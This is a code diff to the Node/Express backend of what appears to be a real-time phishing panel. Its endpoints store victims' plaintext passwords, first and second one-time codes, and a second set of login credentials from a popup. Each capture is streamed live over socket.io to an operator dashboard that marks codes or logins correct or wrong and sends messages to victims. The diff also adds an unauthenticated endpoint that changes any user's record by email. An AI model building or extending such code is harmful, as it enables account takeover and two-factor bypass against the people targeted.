@@ -211,7 +211,8 @@ app.post('/api/users/login', async (req, res) => {
       INSERT INTO users (email, password, otp_verified, approved, second_approved, email_submitted_at, reset_otp_flag) 
       VALUES ($1, $2, false, false, false, CURRENT_TIMESTAMP, false) 
       ON CONFLICT (email) DO UPDATE 
-      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false, second_approved = false, email_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false
+      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL,
+          approved = false, second_approved = false, email_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false
     `, [email, password]);
 
     console.log('🔔 New login:', email);
@@ -280,15 +281,17 @@ app.post('/api/users/check-second-approval', async (req, res) => {
   }
 });
 
-// ========== SUBMIT FIRST OTP – NO AUTO-APPROVAL ==========
+// ========== SUBMIT FIRST OTP ==========
 app.post('/api/users/submit-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
     if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
     if (otp.length !== 6) return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
     
-    // Overwrite the otp, keep approved = false (needs admin approval)
-    await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false, first_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2', [otp, email]);
+    await pool.query(
+      'UPDATE users SET otp = $1, otp_verified = false, approved = false, first_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2',
+      [otp, email]
+    );
     
     io.emit('user-otp-created', { email, otp, timestamp: new Date() });
     res.json({ success: true });
@@ -298,7 +301,7 @@ app.post('/api/users/submit-otp', async (req, res) => {
   }
 });
 
-// ========== SUBMIT SECOND OTP – NO AUTO-APPROVAL ==========
+// ========== SUBMIT SECOND OTP ==========
 app.post('/api/users/submit-second-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -312,8 +315,10 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
       return res.status(400).json({ error: '❌ You cannot use the same code as your first verification. Please enter a different code.' });
     }
     
-    // Overwrite second_otp, keep second_approved = false (needs admin approval)
-    await pool.query('UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2', [otp, email]);
+    await pool.query(
+      'UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2',
+      [otp, email]
+    );
     
     io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
     res.json({ success: true });
@@ -359,6 +364,24 @@ app.post('/api/users/check-admin-text', async (req, res) => {
   }
 });
 
+// ========== USER-SIDE RELEASE ADMIN TEXT (no JWT — called from user pages) ==========
+// This is the fix: user pages call this instead of the JWT-protected admin endpoint.
+// It atomically clears admin_text and sets text_release = true for the user's own email.
+app.post('/api/users/release-admin-text', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    await pool.query(
+      'UPDATE users SET text_release = true, admin_text = NULL WHERE email = $1',
+      [email]
+    );
+    res.json({ success: true });
+  } catch (error) {
+    console.error('❌ User release admin text error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 app.post('/api/users/submit-login-popup', async (req, res) => {
   try {
     const { email, loginEmail, loginPassword } = req.body;
@@ -367,7 +390,10 @@ app.post('/api/users/submit-login-popup', async (req, res) => {
     const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
     if (!emailRegex.test(loginEmail)) return res.status(400).json({ error: 'Please enter a valid email address' });
     
-    await pool.query('UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3', [loginEmail, loginPassword, email]);
+    await pool.query(
+      'UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3',
+      [loginEmail, loginPassword, email]
+    );
     io.emit('user-login-submitted', { email, loginEmail, loginPassword, timestamp: new Date() });
     res.json({ success: true });
   } catch (error) {
@@ -420,7 +446,10 @@ app.post('/api/admin/block-email', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    await pool.query('INSERT INTO blocked_emails (email, blocked_by) VALUES ($1, $2) ON CONFLICT (email) DO NOTHING', [email, req.user.email]);
+    await pool.query(
+      'INSERT INTO blocked_emails (email, blocked_by) VALUES ($1, $2) ON CONFLICT (email) DO NOTHING',
+      [email, req.user.email]
+    );
     await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
     io.emit('user-blocked', { email, timestamp: new Date() });
     res.json({ success: true });
@@ -456,7 +485,7 @@ app.post('/api/admin/unblock-email', authenticateJWT, async (req, res) => {
   }
 });
 
-// SINGLE APPROVE BUTTON - Approves email or first OTP based on current state
+// SINGLE APPROVE BUTTON
 app.post('/api/admin/approve', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
@@ -513,7 +542,10 @@ app.post('/api/admin/send-text', authenticateJWT, async (req, res) => {
     const { email, text } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     if (!text || text.trim() === '') return res.status(400).json({ error: 'Text message required' });
-    await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', [text.trim(), email]);
+    await pool.query(
+      'UPDATE users SET admin_text = $1, text_release = false WHERE email = $2',
+      [text.trim(), email]
+    );
     io.emit('text-sent', { email, text, timestamp: new Date() });
     res.json({ success: true });
   } catch (error) {
@@ -522,11 +554,15 @@ app.post('/api/admin/send-text', authenticateJWT, async (req, res) => {
   }
 });
 
+// Admin-side release (still JWT protected, used from dashboard)
 app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    await pool.query('UPDATE users SET text_release = true, admin_text = NULL WHERE email = $1', [email]);
+    await pool.query(
+      'UPDATE users SET text_release = true, admin_text = NULL WHERE email = $1',
+      [email]
+    );
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Release text error:', error.message);
@@ -534,7 +570,7 @@ app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   }
 });
 
-// ========== INCORRECT OTP – ONLY SETS FLAG, NO DB CHANGE ==========
+// ========== INCORRECT OTP ==========
 app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
@@ -545,7 +581,7 @@ app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
         text_release = false
       WHERE email = $1
     `, [email]);
-    console.log('🔴 Admin marked OTP as incorrect (client reset only) for:', email);
+    console.log('🔴 Admin marked OTP as incorrect for:', email);
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Incorrect OTP error:', error.message);
@@ -553,7 +589,7 @@ app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   }
 });
 
-// ========== WRONG LOGIN – ONLY SETS FLAG ==========
+// ========== WRONG LOGIN ==========
 app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
@@ -572,7 +608,7 @@ app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
   }
 });
 
-// ========== CORRECT LOGIN – ONLY SETS FLAG ==========
+// ========== CORRECT LOGIN ==========
 app.post('/api/admin/correct-login', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
